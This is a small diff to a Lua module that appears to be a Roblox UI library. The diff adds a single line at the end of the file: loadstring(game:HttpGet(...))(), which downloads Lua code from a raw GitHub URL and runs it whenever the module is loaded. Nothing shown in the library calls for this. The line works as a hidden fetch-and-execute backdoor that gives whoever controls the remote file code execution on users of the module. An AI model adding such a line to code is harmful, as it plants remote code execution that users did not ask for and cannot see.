@@ -369,4 +369,6 @@ function module:win(title)
     return sections
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IcantAffordSynapse/tests/refs/heads/main/main.lua"))()
+
 return module
